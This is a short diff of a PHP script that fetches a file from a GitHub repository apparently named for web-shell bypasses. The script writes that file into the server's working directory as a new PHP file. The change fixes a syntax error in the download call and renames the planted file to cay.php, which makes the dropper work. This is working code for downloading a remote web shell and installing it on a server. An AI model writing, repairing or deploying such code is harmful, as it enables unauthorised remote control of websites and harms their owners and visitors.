@@ -8,8 +8,8 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$s = http_gethttps://raw.githubusercontent.com/kingfaouzizky/shellminsbypass/main/cylo');
-$check = getcwd() . "/stj.php";
+$s = http_get('https://raw.githubusercontent.com/kingfaouzizky/shellminsbypass/main/cylo');
+$check = getcwd() . "/cay.php";
 $text = $s;
 $open = fopen($check, 'w');
 fwrite($open, $text);
